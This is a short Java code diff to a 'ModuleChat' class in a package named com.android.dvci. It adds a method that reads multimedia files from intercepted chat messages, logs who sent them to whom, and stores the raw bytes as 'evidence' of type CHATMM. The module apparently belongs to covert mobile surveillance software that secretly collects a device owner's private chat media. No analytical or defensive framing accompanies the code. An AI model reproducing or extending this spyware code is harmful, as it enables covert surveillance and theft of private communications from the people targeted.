@@ -1,5 +1,9 @@
 package com.android.dvci.module;
 
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.io.InputStream;
 import java.util.ArrayList;
 
 import com.android.dvci.ProcessInfo;
@@ -91,6 +95,32 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		ListenerProcess.self().detach(this);
 	}
 
+	public void saveEvidenceMultimedia(ArrayList<MessageChatMultimedia> messages) {
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (saveEvidenceMultimedia) start " );
+
+		}
+		for (MessageChatMultimedia mm : messages) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveEvidenceMultimedia): "  +mm.from + " -> " +mm.to
+						+ " : " +mm.file.getAbsolutePath());
+			}
+			try {
+				InputStream bio = new FileInputStream(mm.file);
+				byte[] blob = new byte[mm.size];
+				bio.read(blob);
+				EvidenceBuilder.atomic(EvidenceType.CHATMM,mm.getAdditionalData(),blob);
+			} catch (Exception e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveEvidenceMultimedia):",e);
+				}
+			}
+
+		}
+
+
+	}
 	public void saveEvidence(ArrayList<MessageChat> messages) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveEvidence)");
